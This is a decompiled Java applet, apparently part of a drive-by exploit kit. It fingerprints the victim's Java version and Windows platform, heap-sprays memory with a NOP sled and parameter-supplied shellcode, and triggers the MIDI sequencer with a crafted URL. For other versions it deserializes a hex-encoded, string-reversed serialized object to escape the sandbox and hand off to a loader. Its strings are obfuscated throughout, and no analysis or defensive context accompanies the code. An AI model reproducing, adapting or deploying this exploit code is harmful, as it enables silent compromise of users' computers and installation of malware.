// 
// Decompiled by Procyon v0.5.30
// 

package dev.s;

import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

public class sucks extends Applet
{
    String huinaN1;
    String huinaN2;
    String huinaN3;
    String huinaN4;
    String ThisBigHuina;
    String EsheOdnaHuina;
    String ReelBigHuina;
    String THisReelBIgHuinaN2;
    private IntBuffer[] mem;
    String cont1;
    String cont;
    private final String SO;
    public static String data;
    
    static {
        sucks.data = null;
    }
    
    public sucks() {
        this.huinaN1 = "A000C".concat("A469F2E4FFF").concat("FF87078").concat("70000208").concat("D904CDD76").concat("C4B8E585").concat("27564616F").concat("6C4E23").concat("7E26756").concat("46D000").concat("273787").concat("000000").concat("000000");
        this.huinaN2 = "0000200".concat("000").concat("006000").concat("E7001757").concat("00000000").concat("00006000000").concat("0A077F1E1F1").concat("E1F1F1E1F1E1F").concat("1C1F1C000").concat("0000078").concat("70000200E4").concat("580608F713FC").concat("A24B5").concat("2000275").concat("7000000000000");
        this.huinaN3 = "000000000".concat("000").concat("00000").concat("000000").concat("000000").concat("000000000000").concat("0000020000").concat("00000C88").concat("4EF0000000").concat("000000000").concat("0000000000").concat("00000000000").concat("0000000000008E");
        this.huinaN4 = "E63".concat("00E6F63777164").concat("4F21636").concat("962756D").concat("614E000470787").concat("B376E696274").concat("735F276E616C6").concat("F2166716").concat("A6C42100474").concat("4942000").concat("C41000201A").concat("CA44775F9E3B1");
        this.ThisBigHuina = "356E6F6A556D6964".concat("5E2C6964757E216").concat("6716A621002787").concat("24B520004786477").concat("6E656C48647E6F6D6B").concat("000B54786769").concat("6C69716445637").concat("57B000A52716569547").concat("27164737").concat("9000945646F6D456").concat("D69645472").concat("7164737D00").concat("09456D6964").concat("5472716").concat("4737").concat("900094").concat("8647E6F6D44").concat("727164737A").concat("000945646").concat("F6D447271647").concat("37900094B").concat("656567566F497164").concat("44727164737E").concat("0009497164447271").concat("647378000").concat("94D6165").concat("6274735E6F4").concat("E6F69637275").concat("665C61696").concat("275637510094").concat("475637666").concat("6F47716279").concat("000945646F6D4").concat("56D6964546E");
        this.EsheOdnaHuina = "656B0009456D6".concat("964546E6567000").concat("948647E6F6D446E65").concat("68000945646F6").concat("D446E6567").concat("00094B65656").concat("7566F49716").concat("4446E656C00094").concat("971644").concat("46E656").concat("60009437").concat("76E696").concat("67163547").concat("3746A000").concat("942100306").concat("A5FE51D06").concat("D576A").concat("F56E6F");
        this.ReelBigHuina = "6A556D6964".concat("556C607D69").concat("635E2C69").concat("64757E2").concat("166716A68").concat("100273710").concat("1010101").concat("0101010").concat("10101010").concat("101010").concat("101011000").concat("000078700").concat("00202ED5").concat("8B419302F").concat("875A5B52").concat("00027").concat("5700000000").concat("00C884EFED").concat("20000022").concat("000000110").concat("0000001").concat("000000400").concat("0000010000").concat("00030000").concat("0002000000").concat("0A80000").concat("002100000").concat("04000000").concat("051000000").concat("40000000").concat("9D70000010").concat("000000110").concat("000000787").concat("0000205A").concat("2BAE67620").concat("6ABD494B5").concat("20002").concat("757E0CFA3").concat("65121000").concat("0010000").concat("0002000000").concat("01000000010101").concat("00000001007").concat("87B356E6F6").concat("A556D6964").concat("5F2C696475").concat("7F2166716A").concat("6C44100475").concat("6E6F6A7400").concat("0C4A5B520").concat("0047475635").concat("37965000B5").concat("94B52000473").concat("746C65696").concat("666000").concat("B556D696").concat("474000A4D6").concat("1656274735").concat("E6F4E6F696").concat("37275665C6").concat("16962756").concat("3751009407D").concat("6164735478");
        this.THisReelBIgHuinaN2 = "756E690009".concat("4B6565675").concat("4737279664").concat("E694379716").concat("44C616D696E").concat("696D6610094").concat("47E65696E65").concat("6C67000A547").concat("563556D6964").concat("537969000A5B").concat("656567566F4").concat("9716444737").concat("279666E0009").concat("44756353746").concat("C6569664562").concat("716C000A5B0").concat("0030E8B5CD").concat("8CE1D4AE6E").concat("271646E6").concat("56C61634E").concat("2C69647").concat("57E2").concat("166716A6210").concat("02787275").concat("667F6475734E61").concat("69627F67656").concat("27760100A410").concat("00201C0D0B5").concat("E6D7DD3F8271646E").concat("656C61634E6").concat("169627F676").concat("562774E2C69").concat("64757E216").concat("6716A6B10").concat("027375").concat("000DECA");
        this.cont1 = this.huinaN1.concat(this.huinaN2).concat(this.huinaN3).concat(this.huinaN4).concat(this.ThisBigHuina).concat(this.EsheOdnaHuina).concat(this.ReelBigHuina).concat(this.THisReelBIgHuinaN2);
        this.cont = new StringBuffer(this.cont1).reverse().toString();
        this.SO = this.cont;
    }
    
    public void init() {
        try {
            final int b = 124;
        }
        catch (Exception e) {
            return;
        }
        final String s2 = "gf5";
        final String s3 = "at".concat("ad");
        final String s4 = "io3";
        final String s5 = new StringBuffer(s3).reverse().toString();
        final String s6 = "dfg";
        final String s7 = "//:e".concat("lif");
        final String s8 = "ope";
        final String s9 = new StringBuffer(s7).reverse().toString();
        final String s10 = "zxc";
        final String s11 = "noi".concat("sre").concat("v.a").concat("vaj");
        final String s12 = "lkd";
        final String s13 = new StringBuffer(s11).reverse().toString();
        final String s14 = "mki";
        final String s15 = "09090909";
        final String s16 = "mn7";
        final String s17 = new StringBuffer(s15).reverse().toString();
        final String s18 = "ioe";
        final String s19 = "ema".concat("n.so");
        final String s20 = "mkq";
        final String s21 = new StringBuffer(s19).reverse().toString();
        final String s22 = "tnq";
        final String s23 = "n".concat("iw");
        final String s24 = "vcf";
        final String s25 = new StringBuffer(s23).reverse().toString();
        final String s26 = System.getProperty(s13);
        final String s27 = this.getParameter(s5);
        final char[] ac = { '?' };
        int i = 0;
        int j = 0;
        while (s27.charAt(i) != ac[0]) {
            j += s27.charAt(i);
            ++i;
        }
        j += 7;
        j %= 256;
        final String s28 = (String)Bladstvo.function(1, "toH".concat("ex").concat("Str").concat("i").concat("ng"), new Object[] { j });
        if ((s26.indexOf("1.".concat("6.").concat("0_1").concat("1")) != -1 || s26.indexOf("1.".concat("6.").concat("0_").concat("12")) != -1 || s26.indexOf("1.".concat("6.").concat("0_1").concat("3")) != -1 || s26.indexOf("1.".concat("6.").concat("0_1").concat("4")) != -1 || s26.indexOf("1.".concat("6.").concat("0_").concat("15")) != -1 || s26.indexOf("1.".concat("6.").concat("0_1").concat("6")) != -1) & s27.indexOf("i=1") == -1) {
            System.out.println("\u041b\u0430\u0436\u04301!!!");
            String s29 = "";
            s29 = repeat('/', 303);
            final String s30 = System.getProperty(s21).toLowerCase();
            if (s30.indexOf(s25) < 0) {
                return;
            }
            s29 = repeat('/', 302);
            try {
                final String s31 = this.getParameter(s5) + "11";
                String s32 = "";
                for (int k = 0; k < s31.length(); ++k) {
                    s32 += (String)Bladstvo.function(1, "toHexString", new Object[] { s31.charAt(k) });
                }
                while (s32.length() % 8 != 0) {
                    s32 += "26";
                }
                this.mem = this.spray(s32, s17);
                final URL url = (URL)Bladstvo.con(URL.class.getName(), new Object[] { s29 }, new Class[] { String.class });
                final String s33 = "";
                MidiSystem.getSequencer();
                final String s34 = "";
                final String s35 = "";
                MidiSystem.getSequencer();
                while (true) {
                    Thread.sleep(10L);
                }
            }
            catch (Exception ex) {}
        }
        Label_1323: {
            if (s26 != "1.5.0" && s26.indexOf("1.5.0_01") == -1 && s26.indexOf("1.5.0_02") == -1 && s26.indexOf("1.5.0_03") == -1 && s26.indexOf("1.5.0_04") == -1 && s26.indexOf("1.5.0_05") == -1 && s26.indexOf("1.5.0_06") == -1 && s26.indexOf("1.5.0_07") == -1 && s26.indexOf("1.5.0_08") == -1 && s26.indexOf("1.5.0_09") == -1 && s26.indexOf("1.5.0_10") == -1 && s26.indexOf("1.5.0_11") == -1 && s26.indexOf("1.5.0_12") == -1 && s26.indexOf("1.5.0_13") == -1 && s26.indexOf("1.5.0_14") == -1 && s26.indexOf("1.5.0_15") == -1 && s26.indexOf("1.5.0_16") == -1 && s26 != "1.6.0" && s26 != "1.6.0_01" && s26.indexOf("1.6.0_02") == -1 && s26.indexOf("1.6.0_03") == -1 && s26.indexOf("1.6.0_04") == -1 && s26.indexOf("1.6.0_05") == -1 && s26.indexOf("1.6.0_06") == -1 && s26.indexOf("1.6.0_07") == -1) {
                if (s26.indexOf("1.6.0_10") == -1) {
                    break Label_1323;
                }
            }
            try {
                final byte[] abyte0 = Bladstvo.StringToBytes(this.SO);
                final ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(abyte0));
                final Object obj = objectinputstream.readObject();
                final String s36 = "1";
                String s37 = this.getParameter(s5);
                final String s38 = "ab";
                final String s39 = "cd";
                if (obj != null && LoaderX.instance != null) {
                    final String s40 = "ef";
                    final String s41 = "gh";
                    System.out.println("\u0432\u043e\u0440\u043a\u0430\u0435\u043c");
                    System.out.println(new StringBuilder().append(obj).toString());
                    if (s37 == null) {
                        final String s42 = "ij";
                        s37 = "";
                    }
                    final String s43 = "mn";
                    final String s44 = "op";
                    LoaderX.instance.lalafa(s37, s36);
                }
                final String s45 = "st";
            }
            catch (Exception exception) {
                System.out.println(exception);
                exception.printStackTrace();
            }
        }
        if ((s26.indexOf("1.5.0_17") != -1 || s26.indexOf("1.5.0_18") != -1 || s26.indexOf("1.5.0_19") != -1 || s26.indexOf("1.5.0_20") != -1 || s26.indexOf("1.5.0_21") != -1) & s27.indexOf("i=1") == -1) {
            System.out.println("\u041b\u0430\u0436\u04303!!!");
            String s46 = "";
            s46 = repeat('/', 303);
            final String s47 = System.getProperty(s21).toLowerCase();
            if (s47.indexOf(s25) < 0) {
                return;
            }
            s46 = repeat('/', 304);
            try {
                final String s48 = this.getParameter(s5) + "11";
                String s49 = "";
                for (int l = 0; l < s48.length(); ++l) {
                    s49 += (String)Bladstvo.function(1, "toHexString", new Object[] { s48.charAt(l) });
                }
                while (s49.length() % 8 != 0) {
                    s49 += "26";
                }
                this.mem = this.spray(s49, s17);
                final URL url2 = new URL(s46);
                final String s50 = "";
                MidiSystem.getSequencer();
                final String s51 = "";
                final String s52 = "";
                MidiSystem.getSequencer();
                while (true) {
                    Thread.sleep(10L);
                }
            }
            catch (Exception exception2) {}
        }
    }
    
    public static String Encode(final byte[] in) {
        String mys = "";
        for (int i = 0; i < in.length; ++i) {
            mys = String.valueOf(mys) + "A" + Byte.toString(in[i]);
        }
        return mys;
    }
    
    public static String repeat(final char c, final int i) {
        String s = "";
        for (int j = 0; j < i; ++j) {
            s += c;
        }
        return s;
    }
    
    public static short[] Engaging(final String s) {
        final short[] aword0 = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            final char c = s.charAt(i);
            final char c2 = s.charAt(i + 1);
            int j = Character.digit(c, 16);
            j <<= 4;
            j += Character.digit(c2, 16);
            aword0[i / 2] = (short)j;
        }
        return aword0;
    }
    
    public static byte[] Engaging2(final String s) {
        final String[] ppc = s.split("A");
        final byte[] aword = new byte[ppc.length - 1];
        for (int i = 1; i < ppc.length; ++i) {
            aword[i - 1] = Byte.parseByte(ppc[i]);
        }
        return aword;
    }
    
    public final IntBuffer[] spray(final String s, final String s1) {
        final short[] aword0 = Engaging(s);
        final short[] aword2 = Engaging(s1);
        return this.spray(aword0, aword2);
    }
    
    public final IntBuffer[] spray(final short[] aword0, final short[] aword1) {
        final byte byte0 = 50;
        final int i = 1048576;
        final int j = i / 4 - aword0.length;
        final IntBuffer[] aintbuffer = new IntBuffer[byte0];
        for (int k = 0; k < byte0; ++k) {
            final IntBuffer intbuffer = IntBuffer.allocate(i / 4);
            for (int l = 0; l < j; ++l) {
                intbuffer.put(aword1[0] | aword1[1] << 8 | aword1[2] << 16 | aword1[3] << 24);
            }
            int i2 = 0;
            while (i2 < aword0.length) {
                intbuffer.put(aword0[i2++] | aword0[i2++] << 8 | aword0[i2++] << 16 | aword0[i2++] << 24);
            }
            aintbuffer[k] = intbuffer;
        }
        return aintbuffer;
    }
}
